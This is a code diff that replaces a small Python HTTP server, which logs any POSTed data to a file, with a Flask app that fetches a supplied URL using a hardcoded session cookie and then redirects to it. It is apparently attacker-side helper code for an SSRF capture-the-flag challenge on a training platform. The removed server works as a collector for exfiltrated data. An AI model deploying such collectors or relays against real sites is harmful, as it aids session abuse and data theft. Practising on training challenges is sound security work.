@@ -1,33 +1,51 @@
-from http.server import SimpleHTTPRequestHandler, HTTPServer
-from urllib.parse import unquote
-class CustomRequestHandler(SimpleHTTPRequestHandler):
+from flask import Flask, request, jsonify,redirect
+import requests
 
-    def end_headers(self):
-        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
-        super().end_headers()
+app = Flask(__name__)
 
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'Hello, GET request!')
+@app.route('/', methods=['GET'])
+def call_admin():
+    url = request.args.get('url')  # Get the URL parameter from the query string
+    cookies = {
+        "session": "your_session_cookie_here"  # Reemplaza con la cookie que necesites
+    }
 
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
+    print(f"Attempting to fetch: {url}")
 
-        self.send_response(200)
-        self.end_headers()
+    if not url:
+        return jsonify({
+            'status': 'error',
+            'message': 'Missing URL parameter'
+        }), 400
 
-        # Log the POST data to data.html
-        with open('data.html', 'a') as file:
-            file.write(post_data + '\n')
-        response = f'POST request! Received data: {post_data}'
-        self.wfile.write(response.encode('utf-8'))
+    try:
+        #headers
+        headers={
+            "Host": "juancruzberrios732.ssrfeasychallenge.academy-challenges.com",
+            "Cache-Control": "max-age=0",
+            "Content-Type":"application/x-www-form-urlencoded",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "Referer": url,
+            "Accept-Encoding": "gzip, deflate, br",
+            "Cookie": "PHPSESSID=da405d3c90800b5ef5d78fab5541786b"
+        }
+        #resposnse to debug
+        response = requests.get(url,headers=headers)
+        
+        #Print the response content from the external request
+        print("response content: ", response.text)
+        #if succesfull redirect to url
+        return redirect(url)
+    
+    except requests.exceptions.RequestException as e:
+        # Handle errors if the request fails
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }),500
 
 if __name__ == '__main__':
-    server_address = ('', 8080)
-    httpd = HTTPServer(server_address, CustomRequestHandler)
-    print('Server running on http://localhost:8080/')
-    httpd.serve_forever()
+    app.run(debug=True)
